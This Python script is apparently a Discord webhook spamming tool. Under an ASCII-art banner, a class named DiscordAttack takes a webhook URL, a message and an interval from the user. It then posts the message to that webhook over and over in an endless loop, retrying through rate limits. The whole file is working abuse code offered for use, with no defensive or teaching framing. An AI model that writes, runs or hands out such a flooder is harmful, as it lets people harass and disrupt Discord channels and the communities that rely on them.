import os
import requests
from os import system
from discord_webhook import DiscordWebhook
from urllib.parse import urlparse
import time



class DiscordInfo:
    def __init__(self, webhook, message, milliseconds=1000):
        self.webhook = webhook
        self.message = message
        self.milliseconds = milliseconds

class DiscordAttack:
    def __init__(self):
        self.discord_info = None
        
    def starting(self):
        os.system('cls' if os.name == 'nt' else 'clear')  
        self.show_title()
        self.intro()

    
    def show_title(self):
        print(r" _____    _                                   _ ")
        print(r"|  __ \  (_)                                 | |")
        print(r"| |  | |  _   ___    ___    ___    _ __    __| |")
        print(r"| |  | | | | / __|  / __|  / _ \  | '__|  / _` |")
        print(r"| |__| | | | \__ \ | (__  | (_) | | |    | (_| |")
        print(r"|_____/  |_| |___/  \___|  \___/  |_|     \__,_|")

    def intro(self):
        webhook_url = input("Enter Webhook URL: ")
        if self.check_return(webhook_url):
            webhook_msg = input("Enter Webhook Message: ")
            webhook_mili = input("Enter interval [1000]: ")
            # Use the default interval if no input is provided
            webhook_mili = int(webhook_mili) if webhook_mili else 1000
            self.discord_info = DiscordInfo(webhook_url, webhook_msg, webhook_mili)
            self.attack()
        else:
            self.starting()
            return False

    def check_return(self, URL):
        parsed_url = urlparse(URL)

        if parsed_url.scheme not in ['http', 'https']:
            print('Error: Invalid URL.')
            time.sleep(2)
            return False

        try:
            response = requests.get(URL)
            response.raise_for_status()
            return True
        except requests.exceptions.RequestException as e:
            print(f"Error: {str(e).split('for url')[0]}")
            return False

    def attack(self):
        if not self.discord_info:
            print("No Discord info provided. Exiting...")
            return

        # Function that sends the webhook
        while True:  # Check if stop event is set
            try:
                webhook = DiscordWebhook(url=self.discord_info.webhook, content=self.discord_info.message, rate_limit_retry=True)
                webhook.execute()
                print(f"Message sent: {self.discord_info.message}")
                time.sleep(self.discord_info.milliseconds / 1000)
            except KeyboardInterrupt:
                print("\nProcess was interrupted. Exiting...")
                self.starting()
            except Exception as e:
                print(f"Error occurred: {e}")
                break
        

if __name__ == "__main__":
    print("\033[32;1m")
    system("title " + "Discord")
    attack_instance = DiscordAttack()
    attack_instance.starting()
